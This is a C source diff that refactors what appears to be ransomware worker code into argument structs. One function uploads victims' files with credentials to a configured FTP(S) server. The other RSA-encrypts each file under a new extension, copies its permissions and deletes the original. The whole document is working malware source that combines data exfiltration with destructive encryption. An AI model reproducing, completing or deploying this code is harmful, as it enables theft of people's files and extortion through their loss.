@@ -8,51 +8,64 @@
 #include "../lib/log.h"
 #include "../lib/rsa.h"
 #include "../lib/util.h"
+#include "workers.h"
 
-char *FTP_URL  = NULL;
-char *FTP_USER = NULL;
-char *FTP_PWD  = NULL;
-char *EXT      = NULL;
+void upload_args_free(upload_args_t *args) {
+  free(args->file);
+  free(args);
+}
 
 void upload_file(void *arg) {
-  char *file = (char *)arg;
-  FILE *fp   = fopen(file, "r");
-  if (NULL == fp) {
-    free(file);
+  upload_args_t *args = arg;
+  if (NULL == args)
     return;
-  }
 
-  CURL *curl = curl_easy_init();
-  if (NULL == curl) {
-    free(file);
-    fclose(fp);
-    return;
-  }
-
-  char url[strlen(FTP_URL) + strlen(file) + 3];
-  join(url, FTP_URL, file);
+  char url[strlen(args->url) + strlen(args->file) + 3];
+  join(url, args->url, args->file);
   replace(url, ' ', '_');
 
-  char userpwd[strlen(FTP_USER) + strlen(FTP_PWD) + 2];
-  sprintf(userpwd, "%s:%s", FTP_USER, FTP_PWD);
+  char creds[strlen(args->user) + strlen(args->pwd) + 3];
+  sprintf(creds, "%s:%s", args->user, args->pwd);
+
+  CURL *curl = curl_easy_init();
+  FILE *fp   = fopen(args->file, "r");
+
+  if (NULL == fp) {
+    debug("Failed to open the file: %s", args->file);
+    goto UPLOAD_CLEAN;
+  }
+
+  if (NULL == curl) {
+    debug("Failed to init curl for file: %s", args->file);
+    goto UPLOAD_CLEAN;
+  }
 
   debug("Uploading to FTP(S): %s", url);
   curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
-  curl_easy_setopt(curl, CURLOPT_USERPWD, userpwd);
+  curl_easy_setopt(curl, CURLOPT_USERPWD, creds);
   curl_easy_setopt(curl, CURLOPT_FTP_CREATE_MISSING_DIRS, (long)CURLFTP_CREATE_DIR_RETRY);
   curl_easy_setopt(curl, CURLOPT_URL, url);
   curl_easy_setopt(curl, CURLOPT_READDATA, fp);
 
   CURLcode res = curl_easy_perform(curl);
   if (res != CURLE_OK)
-    error("Failed to upload %s: %s", file, curl_easy_strerror(res));
+    error("Failed to upload %s: %s", args->file, curl_easy_strerror(res));
 
+UPLOAD_CLEAN:
   curl_easy_cleanup(curl);
-  free(file);
+  upload_args_free(args);
   fclose(fp);
 }
 
+void encrypt_args_free(encrypt_args_t *args) {
+  free(args->file);
+  free(args->st);
+  free(args);
+}
+
 void encrypt_file(void *arg) {
+  encrypt_args_t *args = arg;
+
   EVP_PKEY_CTX *ctx = NULL;
 
   unsigned char in_buf[INPUT_SIZE];
@@ -61,59 +74,55 @@ void encrypt_file(void *arg) {
   size_t in_len  = 0;
   size_t out_len = 0;
 
-  bool success = false;
+  bool ok = false;
 
-  char *in_file = (char *)arg;
-  char  out_file[strlen(in_file) + strlen(EXT) + 2];
+  char *in_file = args->file;
+  char  out_file[strlen(in_file) + strlen(args->ext) + 2];
 
-  sprintf(out_file, "%s.%s", in_file, EXT);
-
+  sprintf(out_file, "%s.%s", in_file, args->ext);
   FILE *in  = fopen(in_file, "r");
   FILE *out = fopen(out_file, "a");
 
   if (NULL == in || NULL == out) {
-    debug("(%s) Failed to open in/out", in_file);
-    goto FREE;
+    debug("Failed to open in/out: %s", in_file);
+    goto ENCRYPT_CLEAN;
   }
 
   ctx = rsa_encrypt_init();
   if (NULL == ctx) {
-    debug("(%s) Failed to create ctx", in_file);
-    goto FREE;
+    debug("Failed to create ctx: %s", in_file);
+    goto ENCRYPT_CLEAN;
   }
 
   while ((in_len = fread(in_buf, 1, INPUT_SIZE, in)) > 0) {
     out_len = OUTPUT_SIZE;
     if (!rsa_encrypt(ctx, in_buf, in_len, out_buf, &out_len)) {
-      debug("(%s) Failed to encrypt (%lu -> %lu)", in_file, in_len, out_len);
-      goto FREE;
+      debug("Failed to encrypt: %s (%lu -> %lu)", in_file, in_len, out_len);
+      goto ENCRYPT_CLEAN;
     }
 
     if (fwrite(out_buf, 1, out_len, out) <= 0) {
-      debug("(%s) Failed to write output", in_file);
-      goto FREE;
+      debug("Failed to write output: %s", in_file);
+      goto ENCRYPT_CLEAN;
     }
 
     if (in_len < INPUT_SIZE)
       break;
   }
 
-  struct stat st;
-  fstat(fileno(in), &st);
-
-  if (!copy_stat(fileno(in), fileno(out))) {
-    debug("(%s) Failed to copy perms", in_file);
-    goto FREE;
+  if (!copy_stat(fileno(out), args->st)) {
+    debug("Failed to copy perms: %s", in_file);
+    goto ENCRYPT_CLEAN;
   }
 
   if (unlink(in_file) < 0) {
     debug("(%s) Failed to unlink: %s", in_file);
-    goto FREE;
+    goto ENCRYPT_CLEAN;
   }
 
-  success = true;
+  ok = true;
 
-FREE:
+ENCRYPT_CLEAN:
   if (NULL != ctx)
     rsa_encrypt_free(ctx);
 
@@ -123,10 +132,10 @@ FREE:
   if (NULL != out)
     fclose(out);
 
-  if (!success) {
+  if (!ok) {
     error("Failed to encrypt file: %s", in_file);
     unlink(out_file);
   }
 
-  free(in_file);
+  encrypt_args_free(args);
 }
